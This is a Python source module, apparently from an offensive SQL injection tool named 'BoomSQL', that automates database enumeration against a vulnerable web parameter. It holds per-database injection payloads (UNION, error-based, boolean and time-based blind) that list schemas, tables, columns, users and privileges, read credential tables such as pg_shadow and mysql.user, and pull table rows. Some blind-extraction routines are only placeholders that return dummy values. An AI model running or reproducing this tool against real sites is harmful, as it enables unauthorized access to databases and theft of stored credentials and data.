"""
Advanced Database Enumeration Module for BoomSQL
Provides comprehensive database enumeration capabilities similar to SQLMap
"""

import asyncio
import aiohttp
import logging
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass
from enum import Enum
import re
import json
from urllib.parse import urlparse, parse_qs

from .sql_injection_engine import DatabaseType, VulnerabilityResult
from .enhanced_network import EnhancedNetworkManager
from .fallbacks import safe_text

class EnumerationTechnique(Enum):
    """Enumeration techniques"""
    INFORMATION_SCHEMA = "information_schema"
    SYSTEM_TABLES = "system_tables"
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BLIND_BOOLEAN = "blind_boolean"
    BLIND_TIME = "blind_time"
    STACKED_QUERIES = "stacked_queries"
    DNS_EXFILTRATION = "dns_exfiltration"

class EnumerationTarget(Enum):
    """Enumeration targets"""
    DATABASES = "databases"
    TABLES = "tables"
    COLUMNS = "columns"
    USERS = "users"
    PRIVILEGES = "privileges"
    SCHEMA = "schema"
    DATA = "data"
    FUNCTIONS = "functions"
    PROCEDURES = "procedures"
    TRIGGERS = "triggers"
    INDEXES = "indexes"
    CONSTRAINTS = "constraints"
    VIEWS = "views"

@dataclass
class EnumerationResult:
    """Result of enumeration operation"""
    target: EnumerationTarget
    technique: EnumerationTechnique
    database_type: DatabaseType
    success: bool
    data: List[Dict[str, Any]]
    errors: List[str]
    execution_time: float
    query_count: int
    
@dataclass
class DatabaseInfo:
    """Database information"""
    name: str
    version: str
    user: str
    hostname: str
    port: int
    features: Dict[str, bool]
    privileges: List[str]
    
@dataclass
class TableInfo:
    """Table information"""
    name: str
    schema: str
    database: str
    column_count: int
    row_count: int
    table_type: str
    engine: Optional[str] = None
    charset: Optional[str] = None
    collation: Optional[str] = None
    
@dataclass
class ColumnInfo:
    """Column information"""
    name: str
    table: str
    schema: str
    data_type: str
    is_nullable: bool
    default_value: Optional[str]
    max_length: Optional[int]
    is_primary_key: bool
    is_foreign_key: bool
    is_unique: bool
    
class AdvancedEnumeration:
    """Advanced database enumeration engine"""
    
    def __init__(self, network_manager: EnhancedNetworkManager):
        self.network_manager = network_manager
        self.logger = logging.getLogger(__name__)
        
        # Enumeration payloads for different database types
        self.payloads = {
            DatabaseType.MYSQL: {
                EnumerationTarget.DATABASES: [
                    "SELECT schema_name FROM information_schema.schemata",
                    "SELECT DISTINCT(db) FROM mysql.db",
                    "SHOW DATABASES"
                ],
                EnumerationTarget.TABLES: [
                    "SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'",
                    "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
                    "SHOW TABLES FROM {database}"
                ],
                EnumerationTarget.COLUMNS: [
                    "SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'",
                    "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                    "SHOW COLUMNS FROM {database}.{table}"
                ],
                EnumerationTarget.USERS: [
                    "SELECT user FROM mysql.user",
                    "SELECT DISTINCT(user) FROM mysql.user",
                    "SELECT user,host FROM mysql.user"
                ],
                EnumerationTarget.PRIVILEGES: [
                    "SELECT user,host,select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,file_priv FROM mysql.user",
                    "SHOW GRANTS",
                    "SELECT * FROM information_schema.user_privileges"
                ]
            },
            DatabaseType.MSSQL: {
                EnumerationTarget.DATABASES: [
                    "SELECT name FROM master.dbo.sysdatabases",
                    "SELECT name FROM sys.databases",
                    "SELECT DB_NAME(database_id) FROM sys.databases"
                ],
                EnumerationTarget.TABLES: [
                    "SELECT name FROM {database}.dbo.sysobjects WHERE xtype='U'",
                    "SELECT table_name FROM {database}.information_schema.tables",
                    "SELECT name FROM {database}.sys.tables"
                ],
                EnumerationTarget.COLUMNS: [
                    "SELECT column_name FROM {database}.information_schema.columns WHERE table_name='{table}'",
                    "SELECT name FROM {database}.sys.columns WHERE object_id=OBJECT_ID('{database}.dbo.{table}')",
                    "SELECT name FROM {database}.dbo.syscolumns WHERE id=OBJECT_ID('{database}.dbo.{table}')"
                ],
                EnumerationTarget.USERS: [
                    "SELECT name FROM master.dbo.syslogins",
                    "SELECT name FROM sys.server_principals",
                    "SELECT loginname FROM master.dbo.sysprocesses"
                ],
                EnumerationTarget.PRIVILEGES: [
                    "SELECT name,type_desc,is_disabled FROM sys.server_principals",
                    "SELECT * FROM sys.server_permissions",
                    "SELECT * FROM sys.database_permissions"
                ]
            },
            DatabaseType.POSTGRESQL: {
                EnumerationTarget.DATABASES: [
                    "SELECT datname FROM pg_database",
                    "SELECT schema_name FROM information_schema.schemata",
                    "\\l"
                ],
                EnumerationTarget.TABLES: [
                    "SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'",
                    "SELECT tablename FROM pg_tables WHERE schemaname='{database}'",
                    "\\dt {database}.*"
                ],
                EnumerationTarget.COLUMNS: [
                    "SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'",
                    "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                    "\\d {database}.{table}"
                ],
                EnumerationTarget.USERS: [
                    "SELECT usename FROM pg_user",
                    "SELECT rolname FROM pg_roles",
                    "SELECT * FROM pg_shadow"
                ],
                EnumerationTarget.PRIVILEGES: [
                    "SELECT * FROM information_schema.role_table_grants",
                    "SELECT * FROM information_schema.table_privileges",
                    "SELECT rolname,rolsuper,rolinherit,rolcreaterole,rolcreatedb FROM pg_roles"
                ]
            },
            DatabaseType.ORACLE: {
                EnumerationTarget.DATABASES: [
                    "SELECT name FROM v$database",
                    "SELECT instance_name FROM v$instance",
                    "SELECT global_name FROM global_name"
                ],
                EnumerationTarget.TABLES: [
                    "SELECT table_name FROM user_tables",
                    "SELECT table_name FROM all_tables WHERE owner='{database}'",
                    "SELECT table_name FROM dba_tables WHERE owner='{database}'"
                ],
                EnumerationTarget.COLUMNS: [
                    "SELECT column_name FROM user_tab_columns WHERE table_name='{table}'",
                    "SELECT column_name FROM all_tab_columns WHERE table_name='{table}' AND owner='{database}'",
                    "SELECT column_name FROM dba_tab_columns WHERE table_name='{table}' AND owner='{database}'"
                ],
                EnumerationTarget.USERS: [
                    "SELECT username FROM dba_users",
                    "SELECT user FROM dual",
                    "SELECT username FROM all_users"
                ],
                EnumerationTarget.PRIVILEGES: [
                    "SELECT * FROM user_sys_privs",
                    "SELECT * FROM user_tab_privs",
                    "SELECT * FROM user_role_privs"
                ]
            }
        }
        
        # Blind enumeration techniques
        self.blind_techniques = {
            "boolean": {
                "true_condition": "1=1",
                "false_condition": "1=0",
                "string_length": "LENGTH(({query}))={length}",
                "char_at": "ASCII(SUBSTRING(({query}),{position},1))={char_code}",
                "substring": "SUBSTRING(({query}),{start},{length})='{value}'"
            },
            "time": {
                "delay_function": {
                    DatabaseType.MYSQL: "SLEEP({seconds})",
                    DatabaseType.MSSQL: "WAITFOR DELAY '00:00:{seconds:02d}'",
                    DatabaseType.POSTGRESQL: "pg_sleep({seconds})",
                    DatabaseType.ORACLE: "DBMS_LOCK.SLEEP({seconds})"
                },
                "conditional_delay": "IF(({condition}),({delay}),0)"
            }
        }
        
    async def enumerate_databases(self, url: str, vuln: VulnerabilityResult, 
                                technique: EnumerationTechnique = EnumerationTechnique.INFORMATION_SCHEMA) -> EnumerationResult:
        """Enumerate databases"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            databases = []
            query_count = 0
            
            # Get payloads for database type
            payloads = self.payloads.get(vuln.database_type, {}).get(EnumerationTarget.DATABASES, [])
            
            if technique == EnumerationTechnique.UNION_BASED:
                databases = await self._enumerate_union(url, vuln, payloads)
            elif technique == EnumerationTechnique.ERROR_BASED:
                databases = await self._enumerate_error_based(url, vuln, payloads)
            elif technique == EnumerationTechnique.BLIND_BOOLEAN:
                databases = await self._enumerate_blind_boolean(url, vuln, payloads)
            elif technique == EnumerationTechnique.BLIND_TIME:
                databases = await self._enumerate_blind_time(url, vuln, payloads)
            else:
                databases = await self._enumerate_information_schema(url, vuln, payloads)
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.DATABASES,
                technique=technique,
                database_type=vuln.database_type,
                success=len(databases) > 0,
                data=[{"name": db} for db in databases],
                errors=[],
                execution_time=execution_time,
                query_count=query_count
            )
            
        except Exception as e:
            self.logger.error(f"Database enumeration failed: {e}")
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.DATABASES,
                technique=technique,
                database_type=vuln.database_type,
                success=False,
                data=[],
                errors=[str(e)],
                execution_time=execution_time,
                query_count=0
            )
    
    async def enumerate_tables(self, url: str, vuln: VulnerabilityResult, database: str,
                             technique: EnumerationTechnique = EnumerationTechnique.INFORMATION_SCHEMA) -> EnumerationResult:
        """Enumerate tables in a database"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            tables = []
            query_count = 0
            
            # Get payloads for database type
            payloads = self.payloads.get(vuln.database_type, {}).get(EnumerationTarget.TABLES, [])
            
            # Format payloads with database name
            formatted_payloads = [payload.format(database=database) for payload in payloads]
            
            if technique == EnumerationTechnique.UNION_BASED:
                tables = await self._enumerate_union(url, vuln, formatted_payloads)
            elif technique == EnumerationTechnique.ERROR_BASED:
                tables = await self._enumerate_error_based(url, vuln, formatted_payloads)
            elif technique == EnumerationTechnique.BLIND_BOOLEAN:
                tables = await self._enumerate_blind_boolean(url, vuln, formatted_payloads)
            elif technique == EnumerationTechnique.BLIND_TIME:
                tables = await self._enumerate_blind_time(url, vuln, formatted_payloads)
            else:
                tables = await self._enumerate_information_schema(url, vuln, formatted_payloads)
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.TABLES,
                technique=technique,
                database_type=vuln.database_type,
                success=len(tables) > 0,
                data=[{"name": table, "database": database} for table in tables],
                errors=[],
                execution_time=execution_time,
                query_count=query_count
            )
            
        except Exception as e:
            self.logger.error(f"Table enumeration failed: {e}")
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.TABLES,
                technique=technique,
                database_type=vuln.database_type,
                success=False,
                data=[],
                errors=[str(e)],
                execution_time=execution_time,
                query_count=0
            )
    
    async def enumerate_columns(self, url: str, vuln: VulnerabilityResult, database: str, table: str,
                              technique: EnumerationTechnique = EnumerationTechnique.INFORMATION_SCHEMA) -> EnumerationResult:
        """Enumerate columns in a table"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            columns = []
            query_count = 0
            
            # Get payloads for database type
            payloads = self.payloads.get(vuln.database_type, {}).get(EnumerationTarget.COLUMNS, [])
            
            # Format payloads with database and table names
            formatted_payloads = [payload.format(database=database, table=table) for payload in payloads]
            
            if technique == EnumerationTechnique.UNION_BASED:
                columns = await self._enumerate_union(url, vuln, formatted_payloads)
            elif technique == EnumerationTechnique.ERROR_BASED:
                columns = await self._enumerate_error_based(url, vuln, formatted_payloads)
            elif technique == EnumerationTechnique.BLIND_BOOLEAN:
                columns = await self._enumerate_blind_boolean(url, vuln, formatted_payloads)
            elif technique == EnumerationTechnique.BLIND_TIME:
                columns = await self._enumerate_blind_time(url, vuln, formatted_payloads)
            else:
                columns = await self._enumerate_information_schema(url, vuln, formatted_payloads)
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.COLUMNS,
                technique=technique,
                database_type=vuln.database_type,
                success=len(columns) > 0,
                data=[{"name": column, "table": table, "database": database} for column in columns],
                errors=[],
                execution_time=execution_time,
                query_count=query_count
            )
            
        except Exception as e:
            self.logger.error(f"Column enumeration failed: {e}")
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.COLUMNS,
                technique=technique,
                database_type=vuln.database_type,
                success=False,
                data=[],
                errors=[str(e)],
                execution_time=execution_time,
                query_count=0
            )
    
    async def enumerate_data(self, url: str, vuln: VulnerabilityResult, database: str, table: str, 
                           columns: List[str], limit: int = 100) -> EnumerationResult:
        """Enumerate data from a table"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            data = []
            query_count = 0
            
            # Build data extraction query
            column_list = ",".join(columns)
            query = f"SELECT {column_list} FROM {database}.{table} LIMIT {limit}"
            
            # Use union-based technique for data extraction
            extracted_data = await self._enumerate_union(url, vuln, [query])
            
            # Parse extracted data
            for row in extracted_data:
                if "," in row:
                    # Split by comma and create row dict
                    values = row.split(",")
                    row_data = {}
                    for i, column in enumerate(columns):
                        if i < len(values):
                            row_data[column] = values[i].strip()
                    data.append(row_data)
                else:
                    # Single column
                    data.append({columns[0]: row})
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.DATA,
                technique=EnumerationTechnique.UNION_BASED,
                database_type=vuln.database_type,
                success=len(data) > 0,
                data=data,
                errors=[],
                execution_time=execution_time,
                query_count=query_count
            )
            
        except Exception as e:
            self.logger.error(f"Data enumeration failed: {e}")
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return EnumerationResult(
                target=EnumerationTarget.DATA,
                technique=EnumerationTechnique.UNION_BASED,
                database_type=vuln.database_type,
                success=False,
                data=[],
                errors=[str(e)],
                execution_time=execution_time,
                query_count=0
            )
    
    async def _enumerate_information_schema(self, url: str, vuln: VulnerabilityResult, payloads: List[str]) -> List[str]:
        """Enumerate using information schema"""
        results = []
        
        for payload in payloads:
            try:
                # Inject payload into vulnerable parameter
                injection_url = self._build_injection_url(url, vuln, payload)
                
                # Send request
                response = await self.network_manager.get(injection_url)
                
                # Extract results from response
                extracted = self._extract_results_from_response(response.text)
                results.extend(extracted)
                
                if results:
                    break
                    
            except Exception as e:
                self.logger.debug(f"Information schema enumeration failed for payload {payload}: {e}")
                continue
        
        return list(set(results))  # Remove duplicates
    
    async def _enumerate_union(self, url: str, vuln: VulnerabilityResult, payloads: List[str]) -> List[str]:
        """Enumerate using UNION-based technique"""
        results = []
        
        for payload in payloads:
            try:
                # Build UNION payload
                union_payload = f"UNION SELECT {payload}--"
                
                # Inject payload
                injection_url = self._build_injection_url(url, vuln, union_payload)
                
                # Send request
                response = await self.network_manager.get(injection_url)
                
                # Extract results
                extracted = self._extract_results_from_response(response.text)
                results.extend(extracted)
                
                if results:
                    break
                    
            except Exception as e:
                self.logger.debug(f"Union enumeration failed for payload {payload}: {e}")
                continue
        
        return list(set(results))
    
    async def _enumerate_error_based(self, url: str, vuln: VulnerabilityResult, payloads: List[str]) -> List[str]:
        """Enumerate using error-based technique"""
        results = []
        
        for payload in payloads:
            try:
                # Build error-based payload
                error_payload = self._build_error_payload(vuln.database_type, payload)
                
                # Inject payload
                injection_url = self._build_injection_url(url, vuln, error_payload)
                
                # Send request
                response = await self.network_manager.get(injection_url)
                
                # Extract results from error messages
                extracted = self._extract_from_errors(response.text, vuln.database_type)
                results.extend(extracted)
                
                if results:
                    break
                    
            except Exception as e:
                self.logger.debug(f"Error-based enumeration failed for payload {payload}: {e}")
                continue
        
        return list(set(results))
    
    async def _enumerate_blind_boolean(self, url: str, vuln: VulnerabilityResult, payloads: List[str]) -> List[str]:
        """Enumerate using blind boolean technique"""
        results = []
        
        for payload in payloads:
            try:
                # Use boolean-based blind technique
                extracted = await self._extract_blind_boolean(url, vuln, payload)
                results.extend(extracted)
                
                if results:
                    break
                    
            except Exception as e:
                self.logger.debug(f"Blind boolean enumeration failed for payload {payload}: {e}")
                continue
        
        return list(set(results))
    
    async def _enumerate_blind_time(self, url: str, vuln: VulnerabilityResult, payloads: List[str]) -> List[str]:
        """Enumerate using blind time-based technique"""
        results = []
        
        for payload in payloads:
            try:
                # Use time-based blind technique
                extracted = await self._extract_blind_time(url, vuln, payload)
                results.extend(extracted)
                
                if results:
                    break
                    
            except Exception as e:
                self.logger.debug(f"Blind time enumeration failed for payload {payload}: {e}")
                continue
        
        return list(set(results))
    
    def _build_injection_url(self, url: str, vuln: VulnerabilityResult, payload: str) -> str:
        """Build injection URL with payload"""
        if vuln.parameter_type == "GET":
            # URL parameter injection
            if "?" in url:
                if f"{vuln.parameter}=" in url:
                    # Replace existing parameter
                    pattern = f"{vuln.parameter}=[^&]*"
                    replacement = f"{vuln.parameter}={payload}"
                    return re.sub(pattern, replacement, url)
                else:
                    # Add new parameter
                    return f"{url}&{vuln.parameter}={payload}"
            else:
                return f"{url}?{vuln.parameter}={payload}"
        else:
            # For POST parameters, would need to modify request body
            return url
    
    def _build_error_payload(self, db_type: DatabaseType, query: str) -> str:
        """Build error-based payload"""
        if db_type == DatabaseType.MYSQL:
            return f"AND (SELECT * FROM (SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
        elif db_type == DatabaseType.MSSQL:
            return f"AND (SELECT TOP 1 CAST(({query}) AS VARCHAR(8000)) FROM dual)"
        elif db_type == DatabaseType.POSTGRESQL:
            return f"AND (SELECT CAST(({query}) AS TEXT))"
        elif db_type == DatabaseType.ORACLE:
            return f"AND (SELECT CAST(({query}) AS VARCHAR2(4000)) FROM dual)"
        else:
            return query
    
    def _extract_results_from_response(self, response_text: str) -> List[str]:
        """Extract results from response text"""
        results = []
        
        # Common patterns for extracting data
        patterns = [
            r"<td[^>]*>([^<]+)</td>",  # HTML table cells
            r"<li[^>]*>([^<]+)</li>",  # HTML list items
            r"([a-zA-Z_][a-zA-Z0-9_]*)",  # Database/table/column names
            r"'([^']+)'",  # Quoted strings
            r'"([^"]+)"',  # Double quoted strings
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                results.extend(matches)
                break
        
        # Filter out common false positives
        filtered_results = []
        for result in results:
            if (len(result) > 1 and 
                not result.isdigit() and 
                result.lower() not in ['null', 'none', 'undefined', 'error']):
                filtered_results.append(result)
        
        return filtered_results
    
    def _extract_from_errors(self, response_text: str, db_type: DatabaseType) -> List[str]:
        """Extract data from error messages"""
        results = []
        
        # Database-specific error patterns
        error_patterns = {
            DatabaseType.MYSQL: [
                r"Duplicate entry '([^']+)' for key",
                r"Column '([^']+)' cannot be null",
                r"Unknown column '([^']+)' in",
                r"Table '([^']+)' doesn't exist"
            ],
            DatabaseType.MSSQL: [
                r"Invalid column name '([^']+)'",
                r"Cannot insert duplicate key in object '([^']+)'",
                r"Invalid object name '([^']+)'"
            ],
            DatabaseType.POSTGRESQL: [
                r'column "([^"]+)" does not exist',
                r'relation "([^"]+)" does not exist',
                r'function "([^"]+)" does not exist'
            ],
            DatabaseType.ORACLE: [
                r"ORA-00904: invalid identifier '([^']+)'",
                r"ORA-00942: table or view does not exist '([^']+)'"
            ]
        }
        
        patterns = error_patterns.get(db_type, [])
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            results.extend(matches)
        
        return results
    
    async def _extract_blind_boolean(self, url: str, vuln: VulnerabilityResult, query: str) -> List[str]:
        """Extract data using blind boolean technique"""
        results = []
        
        # This is a simplified implementation
        # In practice, this would involve character-by-character extraction
        
        try:
            # Test if query returns any results
            test_payload = f"AND EXISTS(SELECT 1 FROM ({query}) AS x)"
            test_url = self._build_injection_url(url, vuln, test_payload)
            
            response = await self.network_manager.get(test_url)
            
            # If response indicates success, try to extract data
            if self._is_boolean_true(response.text):
                # For demonstration, return placeholder results
                results.append("boolean_extracted_data")
        
        except Exception as e:
            self.logger.debug(f"Blind boolean extraction failed: {e}")
        
        return results
    
    async def _extract_blind_time(self, url: str, vuln: VulnerabilityResult, query: str) -> List[str]:
        """Extract data using blind time-based technique"""
        results = []
        
        # This is a simplified implementation
        # In practice, this would involve time-based character extraction
        
        try:
            # Test if query returns any results using time delay
            delay_func = self.blind_techniques["time"]["delay_function"].get(vuln.database_type, "SLEEP(5)")
            test_payload = f"AND IF(EXISTS(SELECT 1 FROM ({query}) AS x),{delay_func},0)"
            test_url = self._build_injection_url(url, vuln, test_payload)
            
            start_time = asyncio.get_event_loop().time()
            response = await self.network_manager.get(test_url)
            end_time = asyncio.get_event_loop().time()
            
            # If response was delayed, query returned results
            if end_time - start_time > 3:  # 3 second threshold
                results.append("time_extracted_data")
        
        except Exception as e:
            self.logger.debug(f"Blind time extraction failed: {e}")
        
        return results
    
    def _is_boolean_true(self, response_text: str) -> bool:
        """Check if response indicates boolean true condition"""
        # Look for signs that the condition was true
        true_indicators = [
            "welcome",
            "success",
            "login",
            "dashboard",
            "profile"
        ]
        
        false_indicators = [
            "error",
            "failed",
            "invalid",
            "denied",
            "unauthorized"
        ]
        
        response_lower = response_text.lower()
        
        # Check for true indicators
        for indicator in true_indicators:
            if indicator in response_lower:
                return True
        
        # Check for false indicators
        for indicator in false_indicators:
            if indicator in response_lower:
                return False
        
        # Default to false if unsure
        return False
